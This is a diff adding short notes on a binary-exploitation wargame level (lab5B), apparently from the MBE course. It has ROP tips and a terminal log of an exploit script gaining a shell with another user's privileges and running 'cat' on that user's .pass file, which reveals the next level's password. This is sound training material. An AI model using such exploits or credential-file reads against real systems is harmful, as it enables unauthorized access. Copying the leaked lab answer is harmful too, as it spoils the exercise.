@@ -1,0 +1,39 @@
+lab5B
+
+
+[+] always try to use gdb.attach().
+
+[+] try different shells for possibly different privileges.
+
+[+] beware of ROPs that lead to dead ends. Some int 0x80's failed to 
+	return to ROP chain because of missing 'ret' afterwards.
+
+[+] EBX of execv() can reside in (rw-) memory segment. Doesn't work on stack.
+
+
+
+
+
+
+
+~/lab/rpi_mbe/MBE_release/levels/lab05# python x5B.py
+[+] Connecting to 192.168.203.146 on port 22: Done
+[*] lab5C@192.168.203.146:
+    Distro    Ubuntu 14.04
+    OS:       linux
+    Arch:     i386
+    Version:  3.16.0
+    ASLR:     Disabled
+    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
+[+] Starting remote process '/levels/lab05/./lab5B' on 192.168.203.146: pid 28368
+Insert ROP chain here:
+
+[*] Switching to interactive mode
+$ /bin/sh
+$ $ $ id
+uid=1019(lab5B) gid=1020(lab5B) euid=1020(lab5A) groups=1021(lab5A),1001(gameuser),1020(lab5B)
+$ $ cat /home/lab5A/.pass
+th4ts_th3_r0p_i_lik3_2_s33
+$ $
+
+
